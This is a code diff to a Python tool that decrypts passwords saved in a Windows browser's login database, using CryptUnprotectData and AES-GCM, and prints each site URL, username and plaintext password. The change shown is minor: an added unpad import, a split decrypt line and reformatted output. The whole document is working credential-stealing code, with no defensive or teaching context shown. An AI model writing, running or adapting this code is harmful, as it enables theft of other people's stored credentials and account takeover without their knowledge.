@@ -9,6 +9,7 @@ import base64
 import shutil
 import ctypes
 from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
 from Crypto.Protocol.KDF import PBKDF2
 from win32crypt import CryptUnprotectData
 from ctypes.wintypes import MAX_PATH
@@ -121,11 +122,12 @@ def login_data_parser(login_data_path, decryption_key):
                 encrypted_password = encrypted_password[15:]
                 
                 cipher = AES.new(decryption_key, AES.MODE_GCM, iv)
-                decrypted_password = cipher.decrypt(encrypted_password).decode('utf-8', errors='replace')
+                decrypted_password = cipher.decrypt(encrypted_password)
+                decrypted_password = decrypted_password.decode('utf-8', errors='replace')
                 
-                print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] 🔗 URL: [{bcolors.OKCYAN}" + origin_url + f"{bcolors.ENDC}]")
-                print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] 👤 Username: [{bcolors.OKCYAN}" + username_value + f"{bcolors.ENDC}]")
-                print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] 🔑 Password: [{bcolors.OKCYAN}" + decrypted_password + f"{bcolors.ENDC}]")
+                print(f"|  [{bcolors.OKGREEN}>{bcolors.ENDC}] 🔗 URL: [{bcolors.OKCYAN}" + origin_url + f"{bcolors.ENDC}]")
+                print(f"|  [{bcolors.OKGREEN}>{bcolors.ENDC}] 👤 Username: [{bcolors.OKCYAN}" + username_value + f"{bcolors.ENDC}]")
+                print(f"|  [{bcolors.OKGREEN}>{bcolors.ENDC}] 🔑 Password: [{bcolors.OKCYAN}" + decrypted_password + f"{bcolors.ENDC}]")
                 print(f"| ----------------------------------")
         
         conn.close()
